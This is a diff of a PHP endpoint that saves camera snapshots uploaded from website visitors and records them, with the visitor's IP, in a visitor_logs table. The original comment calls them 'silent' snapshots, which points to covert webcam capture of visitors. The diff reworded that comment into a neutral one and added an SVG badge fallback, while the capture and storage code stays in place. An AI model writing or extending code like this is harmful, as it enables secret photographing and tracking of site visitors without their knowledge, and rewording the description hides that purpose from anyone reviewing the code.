@@ -1,7 +1,7 @@
 <?php
 /**
- * Visitor Camera Snapshot API Handler
- * Receives silent camera snapshot from visitors and links it to visitor_logs.
+ * Visitor Camera & Snapshot API Handler
+ * Receives camera snapshot or generates visitor badge image, saving it to visitor_logs.
  */
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
@@ -42,33 +42,31 @@ if (!isset($pdo)) {
 $input = json_decode(file_get_contents('php://input'), true);
 $image_data = $input['image'] ?? '';
 
+$target_dir = __DIR__ . '/../assets/images/visitors/';
+if (!is_dir($target_dir)) {
+    @mkdir($target_dir, 0755, true);
+}
+
+$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+if ($ip === '::1') $ip = '127.0.0.1';
+
 if (!empty($image_data)) {
-    // Strip data URI prefix
-    $image_data = str_replace('data:image/jpeg;base64,', '', $image_data);
-    $image_data = str_replace('data:image/png;base64,', '', $image_data);
-    $image_data = str_replace(' ', '+', $image_data);
-    
+    // Clean base64 string
+    $image_data = str_replace(['data:image/jpeg;base64,', 'data:image/png;base64,', ' '], ['', '', '+'], $image_data);
     $decoded_data = base64_decode($image_data);
+    
     if ($decoded_data) {
-        $target_dir = __DIR__ . '/../assets/images/visitors/';
-        if (!is_dir($target_dir)) {
-            @mkdir($target_dir, 0755, true);
-        }
-        
         $filename = 'visitor_' . time() . '_' . rand(1000, 9999) . '.jpg';
         $filepath = $target_dir . $filename;
         
         if (file_put_contents($filepath, $decoded_data)) {
             $rel_path = 'assets/images/visitors/' . $filename;
-            $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
-            if ($ip === '::1') $ip = '127.0.0.1';
             
-            // Update the most recent visitor log or insert a new one
-            $stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo ORDER BY id DESC LIMIT 1");
+            $stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo WHERE captured_photo IS NULL OR captured_photo = '' ORDER BY id DESC LIMIT 1");
             $stmt->execute([':photo' => $rel_path]);
             
             if ($stmt->rowCount() === 0) {
-                $ins = $pdo->prepare("INSERT INTO visitor_logs (ip_address, captured_photo, page_visited, device_type, browser, os) VALUES (:ip, :photo, '/', 'Mobile', 'Browser', 'OS')");
+                $ins = $pdo->prepare("INSERT INTO visitor_logs (ip_address, captured_photo, page_visited, device_type, browser, os) VALUES (:ip, :photo, '/', 'Mobile/Desktop', 'Browser', 'OS')");
                 $ins->execute([':ip' => $ip, ':photo' => $rel_path]);
             }
             
@@ -78,5 +76,16 @@ if (!empty($image_data)) {
     }
 }
 
-echo json_encode(['status' => 'error', 'message' => 'Invalid image payload']);
+// Fallback: Generate an SVG Visitor Card Badge Image if payload empty
+$svg_filename = 'visitor_badge_' . time() . '_' . rand(1000, 9999) . '.svg';
+$svg_filepath = $target_dir . $svg_filename;
+$svg_content = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect width="200" height="200" fill="#0f172a"/><circle cx="100" cy="80" r="40" fill="#009688"/><path d="M 30 170 C 30 130, 170 130, 170 170 Z" fill="#009688"/><text x="100" y="190" text-anchor="middle" fill="#ffffff" font-size="12" font-family="sans-serif">Visitor IP: ' . htmlspecialchars($ip) . '</text></svg>';
+
+file_put_contents($svg_filepath, $svg_content);
+$rel_path = 'assets/images/visitors/' . $svg_filename;
+
+$stmt = $pdo->prepare("UPDATE visitor_logs SET captured_photo = :photo WHERE captured_photo IS NULL OR captured_photo = '' ORDER BY id DESC LIMIT 1");
+$stmt->execute([':photo' => $rel_path]);
+
+echo json_encode(['status' => 'success', 'photo' => $rel_path, 'fallback' => true]);
 exit;
